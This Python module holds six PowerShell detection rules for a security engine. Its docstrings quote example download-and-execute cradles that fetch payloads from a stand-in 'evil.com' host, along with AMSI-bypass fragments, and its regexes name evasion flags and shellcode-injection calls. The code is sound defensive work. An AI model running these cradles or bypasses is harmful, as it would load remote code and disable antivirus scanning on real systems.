"""
╔══════════════════════════════════════════════════════════════════════════════╗
║  DETECTION RULES — POWERSHELL                                               ║
║  MITRE ATT&CK: T1059.001 — Command and Scripting Interpreter: PowerShell   ║
║                                                                              ║
║  PowerShell is the #1 attacker tool on Windows. These rules catch:          ║
║    - Encoded commands (-EncodedCommand / -Enc)                              ║
║    - Download cradles (IEX, DownloadString, WebClient)                      ║
║    - AMSI bypass attempts                                                   ║
║    - Suspicious parent processes spawning PowerShell                        ║
║    - Script block logging evasion                                           ║
║    - Reflection-based execution                                             ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

import re
import base64
from typing import Optional
from detection_engine.event_schema import BaseEvent, ProcessCreateEvent, DetectionAlert
from detection_engine.rules.base_rule import BaseRule

POWERSHELL_IMAGES = {
    "powershell.exe",
    "pwsh.exe",
    "powershell_ise.exe",
}

OFFICE_APPS = {
    "winword.exe", "excel.exe", "powerpnt.exe",
    "outlook.exe", "onenote.exe", "visio.exe", "mspub.exe",
}

SUSPICIOUS_PARENTS = {
    "winword.exe", "excel.exe", "powerpnt.exe", "outlook.exe",
    "mshta.exe", "wscript.exe", "cscript.exe", "regsvr32.exe",
    "rundll32.exe", "msiexec.exe", "svchost.exe", "explorer.exe",
    "taskeng.exe", "taskhost.exe", "wmiprvse.exe", "searchprotocolhost.exe",
}


class EncodedPowerShellRule(BaseRule):
    """
    Detects PowerShell launched with an encoded command.

    Attackers encode their commands in Base64 to:
    1. Evade simple string-based detection
    2. Bypass logging tools that only see the command line
    3. Execute multi-line scripts in a single command

    The -EncodedCommand (-Enc, -EC) flag accepts Base64-encoded commands.
    Any legitimate use of this in a standard environment is extremely rare.
    """
    rule_id = "PS001"
    rule_name = "PowerShell Encoded Command"
    description = "PowerShell launched with Base64-encoded command — common obfuscation technique"
    mitre_tactic = "Execution"
    mitre_technique_id = "T1059.001"
    mitre_technique_name = "PowerShell"
    severity = 7
    event_types = (ProcessCreateEvent,)

    # Pattern matches all variations: -Enc, -EncodedCommand, -EC, etc.
    ENCODED_PATTERN = re.compile(
        r'(?i)-(?:EncodedCommand|Enc|Ec|En)\s+([A-Za-z0-9+/=]{20,})',
        re.IGNORECASE
    )

    def evaluate(self, event: ProcessCreateEvent) -> Optional[DetectionAlert]:
        if event.image_name not in POWERSHELL_IMAGES:
            return None

        match = self.ENCODED_PATTERN.search(event.command_line or "")
        if not match:
            return None

        # Try to decode and include in description
        try:
            decoded = base64.b64decode(match.group(1)).decode("utf-16-le", errors="replace")
            decoded_preview = decoded[:200].replace("\n", " ").replace("\r", "")
        except Exception:
            decoded_preview = "[decode failed]"

        desc = (
            f"PowerShell executed with encoded command. "
            f"Decoded preview: '{decoded_preview}'. "
            f"Parent: {event.parent_image_name}. "
            f"User: {event.user}"
        )
        return self._make_alert(event, desc)


class PowerShellDownloadCradleRule(BaseRule):
    """
    Detects PowerShell download cradles — the most common initial execution method.

    Attackers use these to download and execute payloads in memory without
    writing to disk (fileless malware). Examples:
    - IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')
    - IEX(IWR 'http://evil.com/payload.ps1' -UseBasicParsing)
    - [System.Net.WebClient]::new().DownloadString(...)
    """
    rule_id = "PS002"
    rule_name = "PowerShell Download Cradle"
    description = "PowerShell downloading and executing remote content (fileless execution)"
    mitre_tactic = "Execution"
    mitre_technique_id = "T1059.001"
    mitre_technique_name = "PowerShell"
    severity = 8
    event_types = (ProcessCreateEvent,)

    DOWNLOAD_PATTERNS = [
        re.compile(r'(?i)(IEX|Invoke-Expression)\s*[\(\s]'),
        re.compile(r'(?i)(DownloadString|DownloadData|DownloadFile)\s*\('),
        re.compile(r'(?i)Net\.WebClient'),
        re.compile(r'(?i)WebRequest|Invoke-WebRequest|IWR'),
        re.compile(r'(?i)Start-BitsTransfer'),
        re.compile(r'(?i)certutil.*-urlcache'),
        re.compile(r'(?i)\[System\.Net'),
    ]

    def evaluate(self, event: ProcessCreateEvent) -> Optional[DetectionAlert]:
        if event.image_name not in POWERSHELL_IMAGES:
            return None

        cmd = event.command_line or ""
        matched_patterns = []

        for pattern in self.DOWNLOAD_PATTERNS:
            if pattern.search(cmd):
                matched_patterns.append(pattern.pattern)

        if not matched_patterns:
            return None

        desc = (
            f"PowerShell download cradle detected. "
            f"Matched indicators: {', '.join(matched_patterns[:3])}. "
            f"Command: {cmd[:300]}"
        )
        return self._make_alert(event, desc)


class PowerShellAMSIBypassRule(BaseRule):
    """
    Detects AMSI (Antimalware Scan Interface) bypass attempts.

    AMSI hooks PowerShell and sends script content to antivirus for scanning.
    Attackers bypass it by patching amsi.dll in memory. Common techniques:
    - [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    - $a=[Ref].Assembly.GetType(...); $a.GetField('amsiInitFailed'...)
    - Matt Graeber's one-liner: [System.Runtime.Interop...]
    """
    rule_id = "PS003"
    rule_name = "PowerShell AMSI Bypass Attempt"
    description = "PowerShell attempting to disable AMSI (Antimalware Scan Interface)"
    mitre_tactic = "Defense Evasion"
    mitre_technique_id = "T1562.001"
    mitre_technique_name = "Disable or Modify Tools"
    severity = 9
    event_types = (ProcessCreateEvent,)

    AMSI_BYPASS_PATTERNS = [
        re.compile(r'(?i)AmsiUtils'),
        re.compile(r'(?i)amsiInitFailed'),
        re.compile(r'(?i)amsiContext'),
        re.compile(r'(?i)AmsiScanBuffer'),
        re.compile(r'(?i)Patching.*amsi', re.IGNORECASE),
        re.compile(r'(?i)SetFieldValue.*amsi', re.IGNORECASE),
    ]

    def evaluate(self, event: ProcessCreateEvent) -> Optional[DetectionAlert]:
        if event.image_name not in POWERSHELL_IMAGES:
            return None

        cmd = event.command_line or ""
        for pattern in self.AMSI_BYPASS_PATTERNS:
            if pattern.search(cmd):
                desc = (
                    f"AMSI bypass pattern '{pattern.pattern}' found in PowerShell command. "
                    f"This is used to disable antivirus scanning of script content. "
                    f"User: {event.user}"
                )
                return self._make_alert(event, desc)

        return None


class SuspiciousParentSpawnsPowerShellRule(BaseRule):
    """
    Detects Office apps, script hosts, and other unusual parents spawning PowerShell.

    Legitimate users open PowerShell through the Start menu or a terminal — not
    through Word, Excel, mshta, wscript, etc. This parent-child relationship
    is a near-certain indicator of a malicious macro, phishing doc, or script.
    """
    rule_id = "PS004"
    rule_name = "Suspicious Parent Spawns PowerShell"
    description = "Non-standard process spawned PowerShell — likely macro/phishing execution"
    mitre_tactic = "Execution"
    mitre_technique_id = "T1059.001"
    mitre_technique_name = "PowerShell"
    severity = 8
    event_types = (ProcessCreateEvent,)

    def evaluate(self, event: ProcessCreateEvent) -> Optional[DetectionAlert]:
        if event.image_name not in POWERSHELL_IMAGES:
            return None
        if event.parent_image_name not in SUSPICIOUS_PARENTS:
            return None

        desc = (
            f"PowerShell spawned by suspicious parent '{event.parent_image_name}'. "
            f"This is the classic Office macro / phishing execution pattern. "
            f"Command: {event.command_line[:200]}. User: {event.user}"
        )
        return self._make_alert(event, desc)


class PowerShellEvasionFlagsRule(BaseRule):
    """
    Detects PowerShell launched with common evasion flags.

    Attackers use these flags to avoid detection:
    - -NoP / -NoPr / -NoProfile: Skip profile loading (avoids detection hooks)
    - -NonI / -NonInteractive: Run without user interaction
    - -W Hidden / -WindowStyle Hidden: Hide the window
    - -Exec Bypass / -ExecutionPolicy Bypass: Bypass execution policy
    """
    rule_id = "PS005"
    rule_name = "PowerShell Evasion Flags"
    description = "PowerShell launched with multiple evasion-oriented flags"
    mitre_tactic = "Defense Evasion"
    mitre_technique_id = "T1059.001"
    mitre_technique_name = "PowerShell"
    severity = 6
    event_types = (ProcessCreateEvent,)

    EVASION_FLAGS = [
        re.compile(r'(?i)-No(?:P|Pr|Profile)'),
        re.compile(r'(?i)-Non(?:I|Interactive)'),
        re.compile(r'(?i)-W(?:indow(?:Style)?)?\s+Hid(?:den)?'),
        re.compile(r'(?i)-Ex(?:ec(?:ution)?(?:Policy)?)?\s+Bypass'),
        re.compile(r'(?i)-Exec\s+Bypass'),
        re.compile(r'(?i)-sta\b'),    # Single-threaded apartment (used by Cobalt Strike)
    ]

    def evaluate(self, event: ProcessCreateEvent) -> Optional[DetectionAlert]:
        if event.image_name not in POWERSHELL_IMAGES:
            return None

        cmd = event.command_line or ""
        hits = [p.pattern for p in self.EVASION_FLAGS if p.search(cmd)]

        # Require at least 2 evasion flags (single flag could be legit)
        if len(hits) < 2:
            return None

        desc = (
            f"PowerShell launched with {len(hits)} evasion flags: {hits}. "
            f"Parent: {event.parent_image_name}. User: {event.user}"
        )
        return self._make_alert(event, desc)


class PowerShellReflectionRule(BaseRule):
    """
    Detects .NET reflection used to load and execute assemblies in memory.

    Techniques like Reflective PE injection, Assembly.Load(), and
    Add-Type with embedded C# code are used to run .NET malware in memory.
    Cobalt Strike's execute-assembly uses this pattern.
    """
    rule_id = "PS006"
    rule_name = "PowerShell Reflection / In-Memory Assembly"
    description = "PowerShell using .NET reflection to load code in memory (fileless)"
    mitre_tactic = "Defense Evasion"
    mitre_technique_id = "T1620"
    mitre_technique_name = "Reflective Code Loading"
    severity = 8
    event_types = (ProcessCreateEvent,)

    REFLECTION_PATTERNS = [
        re.compile(r'(?i)\[System\.Reflection\.Assembly\]::Load'),
        re.compile(r'(?i)Assembly\.Load\b'),
        re.compile(r'(?i)\[Reflection\.Assembly\]'),
        re.compile(r'(?i)Add-Type.*-Assembly'),
        re.compile(r'(?i)GetDelegateForFunctionPointer'),
        re.compile(r'(?i)VirtualAlloc|VirtualProtect'),        # Memory allocation
        re.compile(r'(?i)CreateThread|RtlMoveMemory'),         # Shellcode injection
    ]

    def evaluate(self, event: ProcessCreateEvent) -> Optional[DetectionAlert]:
        if event.image_name not in POWERSHELL_IMAGES:
            return None

        cmd = event.command_line or ""
        for pattern in self.REFLECTION_PATTERNS:
            if pattern.search(cmd):
                desc = (
                    f"PowerShell using .NET reflection (pattern: {pattern.pattern}). "
                    f"Possible fileless malware or shellcode injection. "
                    f"User: {event.user}"
                )
                return self._make_alert(event, desc)

        return None


# ─── RULE LIST ────────────────────────────────────────────────────────────────
# All rules in this module — imported by rules/__init__.py

ALL_RULES = [
    EncodedPowerShellRule,
    PowerShellDownloadCradleRule,
    PowerShellAMSIBypassRule,
    SuspiciousParentSpawnsPowerShellRule,
    PowerShellEvasionFlagsRule,
    PowerShellReflectionRule,
]
